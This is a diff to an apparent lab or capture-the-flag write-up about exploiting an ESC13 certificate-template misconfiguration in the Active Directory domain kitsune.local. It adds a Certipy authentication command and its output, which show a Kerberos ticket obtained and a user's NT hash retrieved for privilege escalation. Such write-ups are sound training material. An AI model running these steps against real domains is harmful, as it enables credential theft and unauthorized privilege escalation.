@@ -292,6 +292,8 @@ Looks like its vulnerable to esc13
 
 This group has GenericAll on `schlop`
 
+# Compromising 
+
 https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc13-issuance-policy-with-privileged-group-linked
 
 ```python
@@ -323,7 +325,23 @@ Certipy v5.1.0 - by Oliver Lyak (ly4k)
 I now have the PFX
 
 ```python
+❯❯❯ certipy-ad auth -pfx 'ranch.pfx' -dc-ip '10.1.176.128' 
+Certipy v5.1.0 - by Oliver Lyak (ly4k)
 
+[*] Certificate identities:
+[*]     SAN UPN: 'ranch@kitsune.local'
+[*]     Security Extension SID: 'S-1-5-21-3773590124-4237107295-2360938966-1103'
+[*] Using principal: 'ranch@kitsune.local'
+[*] Trying to get TGT...
+[*] Got TGT
+[*] Saving credential cache to 'ranch.ccache'
+[*] Wrote credential cache to 'ranch.ccache'
+[*] Trying to retrieve NT hash for 'ranch'
+[*] Got hash for 'ranch@kitsune.local': aad3b435b51404eeaad3b435b51404ee:47d29308446189faa2acec65586963c1
 ```
+
+I now have a TGT for the user, this TGT should contain the SID of the helpdesk group
+
+
 
 
